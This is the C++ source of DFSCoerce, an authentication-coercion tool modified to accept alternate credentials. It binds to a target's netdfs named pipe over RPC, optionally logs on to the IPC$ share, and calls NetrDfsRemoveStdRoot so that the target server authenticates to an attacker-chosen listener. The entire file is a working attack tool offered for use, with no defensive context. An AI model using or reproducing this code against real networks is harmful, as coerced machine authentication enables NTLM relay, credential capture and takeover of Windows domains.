// DFSCoerce.cpp : Original source form https://github.com/jfma7/DFSCoerce-exe
// Added the ability to specify alternate credentials for explicit authentication. 
// This can be particularly useful when running from a non-domain-joined machine with local user  or when there is a need to execute it as a different user.
// @decoder_it
// github : decoder-it

#include <iostream>
#include "ms-dfsnm_h.h"
#include "ms-dtyp_h.h"
#pragma comment(lib, "RpcRT4.lib")
void  usage()
{
    printf("Supply these arguments: -t <target server> -l <listener address>\nOptional: [-u DOMAIN\\user] [-p password]\n");
    exit(-1  );
}
int wmain(int argc, wchar_t* argv[])
{




    int status;
    RPC_WSTR StringBinding;
    RPC_BINDING_HANDLE binding_handle;
    wchar_t text_wchar[100], ipcshare[256];


    
    wchar_t* user = NULL;
    wchar_t* password = NULL;
    wchar_t* target = NULL;
    wchar_t* listener = NULL;


    while ((argc > 1) && (argv[1][0] == '-'))
    {
        switch (argv[1][1])
        {


        case 'u':
            ++argv;
            --argc;
            user = argv[1];
            break;

        
        case 'p':
            ++argv;
            --argc;
            password = argv[1];
            break;

        case 't':
            ++argv;
            --argc;
            target = argv[1];
            break;
        case 'l':
            ++argv;
            --argc;
            listener = argv[1];
            break;

        default:
            wprintf(L"Wrong Argument: %s\n", argv[1]);
            usage();

        }
        ++argv;
        --argc;
    }
    if (listener == NULL || target == NULL)
        usage();



    swprintf(text_wchar, 100, L"\\\\%s", target);
    swprintf(ipcshare, 255, L"\\\\%s\\ipc$", target);
    
    status = RpcStringBindingCompose(
        NULL,                       // Interface's GUID, will be handled by NdrClientCall
        (RPC_WSTR)L"ncacn_np",      // Protocol sequence
        (RPC_WSTR)text_wchar, // Network address
        (RPC_WSTR)L"\\pipe\\netdfs", // Endpoint
        NULL,                       // No options here
        &StringBinding              // Output string binding
    );
    if (status != RPC_S_OK)
    {
        printf("[!] Error in RpcStringBindingCompose: %d\n", status);
        return -1;
    }
    
    status = RpcBindingFromStringBinding(
        StringBinding,              // Previously created string binding
        &binding_handle                    // Output binding handle
    );
    if (status != RPC_S_OK)
    {
        printf("[!] Error in RpcBindingFromStringBinding: %d\n", status);
        return -1;
    }
    
    NETRESOURCE nr = { 0, RESOURCETYPE_DISK,0, 0, NULL, NULL, NULL, NULL };

    nr.lpRemoteName = ipcshare;
    
    if (user != NULL)
    {    DWORD dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
    
         dwRet = WNetAddConnection2(&nr, password, user, CONNECT_TEMPORARY);
         if (dwRet != NO_ERROR)
         {
             printf("[!] Error connecting to: %S - %d\n", ipcshare, GetLastError());
             return 1;
         }
    
    }

    
    printf("[*] Attempting to coerce auth on ncacn_np:%S[\\PIPE\\netdfs] and receive connection on: %S\n", target, listener);

    NET_API_STATUS nstatus=NetrDfsRemoveStdRoot(binding_handle, listener, (WCHAR*)"test", 1);
    printf("[+] DfsCoerce seems successful, check listener running on:%S\n",listener);

    return 1;
}
